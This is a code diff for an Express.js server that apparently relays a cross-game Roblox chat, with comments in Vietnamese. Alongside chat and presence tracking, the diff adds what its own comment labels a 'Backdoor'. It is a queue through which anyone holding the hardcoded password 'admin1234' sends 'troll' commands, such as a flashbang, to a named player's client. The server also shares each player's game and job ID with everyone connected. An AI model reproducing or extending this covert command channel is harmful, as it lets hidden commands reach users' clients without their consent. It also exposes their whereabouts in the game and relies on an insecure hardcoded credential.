@@ -3,37 +3,69 @@ const app = express();
 app.use(express.json());
 
 let chatHistory = [];
+let onlinePlayers = {}; // Lưu thông tin người đang online
+let adminCommands = {}; // Lưu lệnh troll { "TenNguoiBiTroll": [{type: "flashbang", data: ""}] }
 
-app.post('/send', (req, res) => {
-    const { player, message } = req.body;
-    if (!player || !message) return res.status(400).json({ error: "No data" });
+// Endpoint duy nhất để Đồng Bộ (Sync) mọi thứ cho đỡ lag
+app.post('/sync', (req, res) => {
+    const data = req.body;
+    if (!data.player) return res.status(400).json({ error: "Missing data" });
 
-    let msgType = "text";
-    let content = message;
-
-    // Kiểm tra lệnh /copy hoặc /Copy
-    if (message.toLowerCase().startsWith("/copy ")) {
-        msgType = "file";
-        content = message.substring(6); // Lấy phần nội dung sau lệnh
-    }
-
-    const newMsg = {
-        player: player,
-        message: content,
-        type: msgType,
-        time: Date.now()
+    // 1. Cập nhật trạng thái người chơi này (Sống lại mỗi khi ping)
+    onlinePlayers[data.player] = {
+        customName: data.customName || data.player,
+        hideInfo: data.hideInfo,
+        game: data.game, // Tên game
+        jobId: data.jobId,
+        isVip: data.isVip,
+        maxPlayers: data.maxPlayers,
+        avatar: data.avatar, // Link Avatar Roblox
+        lastSeen: Date.now()
     };
 
-    chatHistory.push(newMsg);
-    res.json({ success: true });
-});
+    // 2. Nhận tin nhắn mới nếu có
+    if (data.newMessage) {
+        chatHistory.push({
+            player: data.customName || data.player,
+            realName: data.player,
+            message: data.newMessage,
+            type: data.msgType || "text",
+            time: Date.now()
+        });
+        if (chatHistory.length > 50) chatHistory.shift();
+    }
 
-app.get('/chat', (req, res) => {
-    const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
-    // Tự động lọc bỏ các tin nhắn cũ hơn 10 phút
-    chatHistory = chatHistory.filter(msg => msg.time > tenMinutesAgo);
-    res.json(chatHistory);
+    // 3. Xử lý Lệnh Admin (Nếu người này là Admin gửi lệnh)
+    if (data.adminAction && data.adminPass === "admin1234") {
+        const target = data.adminAction.target;
+        if (!adminCommands[target]) adminCommands[target] = [];
+        adminCommands[target].push(data.adminAction.command);
+    }
+
+    // 4. Kiểm tra xem mình có bị Admin nhắm tới không (Backdoor)
+    let myCommands = [];
+    if (adminCommands[data.player]) {
+        myCommands = [...adminCommands[data.player]];
+        adminCommands[data.player] = []; // Nhận xong thì xóa lệnh
+    }
+
+    // 5. Lọc người AFK (quá 2 phút không ping coi như offline)
+    const now = Date.now();
+    for (let p in onlinePlayers) {
+        if (now - onlinePlayers[p].lastSeen > 120000) delete onlinePlayers[p];
+    }
+
+    // Lọc tin nhắn cũ
+    const tenMins = now - (10 * 60 * 1000);
+    chatHistory = chatHistory.filter(m => m.time > tenMins);
+
+    // Trả về toàn bộ dữ liệu
+    res.json({
+        chat: chatHistory,
+        online: onlinePlayers,
+        commands: myCommands
+    });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Server Global Chat V2 Live!"));
+app.listen(PORT, () => console.log("Global Network V3 Live!"));
